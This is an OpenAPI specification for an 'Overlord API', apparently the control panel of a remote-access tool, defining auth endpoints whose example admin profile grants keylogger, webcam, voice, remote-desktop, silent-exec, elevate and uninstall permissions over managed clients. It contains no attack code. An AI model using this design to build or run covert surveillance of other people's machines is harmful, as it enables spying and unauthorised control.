openapi: '3.0.3'
info:
  title: Overlord API
  version: 0.1.0
servers:
  - url: '{scheme}://{host}/{basePath}'
    variables:
      scheme:
        enum: [https, http]
        default: https
      host:
        default: localhost:5173
      basePath:
        default: api
security:
  - overlord_token: []
paths:
  /auth/feature-check:
    get:
      tags:
      - auth
      summary: GET /auth/feature-check
      parameters:
      - in: query
        name: feature
        schema:
          type: string
        style: form
      - in: query
        name: clientId
        schema:
          type: string
        style: form
      responses:
        '200':
          description: OK
          content:
            application/json:
              schema:
                type: object
                properties:
                  allowed:
                    type: boolean
              examples:
                response_1:
                  value:
                    allowed: true
  /auth/me:
    get:
      tags:
      - auth
      summary: GET /auth/me
      responses:
        '200':
          description: OK
          content:
            application/json:
              schema:
                type: object
                properties:
                  canBuild:
                    type: boolean
                  canUploadFiles:
                    type: boolean
                  featurePermissions:
                    type: object
                    properties:
                      backstage:
                        type: boolean
                      client_metadata:
                        type: boolean
                      console:
                        type: boolean
                      disconnect:
                        type: boolean
                      file_browser:
                        type: boolean
                      keylogger:
                        type: boolean
                      processes:
                        type: boolean
                      reconnect:
                        type: boolean
                      remote_desktop:
                        type: boolean
                      uninstall:
                        type: boolean
                      voice:
                        type: boolean
                      webcam:
                        type: boolean
                  inputArchiveEnabled:
                    type: boolean
                  mustChangePassword:
                    type: boolean
                  needsOnboarding:
                    type: boolean
                  permissions:
                    type: array
                    items:
                      type: string
                  role:
                    type: string
                  telegramChatId:
                    type: string
                  userId:
                    type: integer
                  username:
                    type: string
              examples:
                admin:
                  value:
                    canBuild: true
                    canUploadFiles: true
                    featurePermissions:
                      backstage: true
                      client_metadata: true
                      console: true
                      disconnect: true
                      file_browser: true
                      keylogger: true
                      processes: true
                      reconnect: true
                      remote_desktop: true
                      uninstall: true
                      voice: true
                      webcam: true
                    inputArchiveEnabled: false
                    mustChangePassword: false
                    needsOnboarding: false
                    permissions:
                    - users:manage
                    - clients:control
                    - clients:build
                    - clients:enroll
                    - clients:silent-exec
                    - clients:disconnect
                    - clients:reconnect
                    - clients:metadata
                    - clients:uninstall
                    - audit:view
                    - chat:write
                    - files:upload
                    - scripts:manage
                    - deploys:manage
                    - plugins:manage
                    - plugins:configure
                    - network:manage-bans
                    - system:configure
                    - system:security
                    - system:tls
                    - system:oidc
                    - system:registration
                    - system:notifications
                    - system:chat
                    - system:appearance
                    - system:thumbnails
                    - system:input-archive
                    - system:build-limits
                    - system:export-import
                    - system:health
                    - system:health:manage
                    - system:profiler
                    - clients:elevate
                    - clients:winre
                    role: admin
                    telegramChatId: '1234567890'
                    userId: 1
                    username: admin
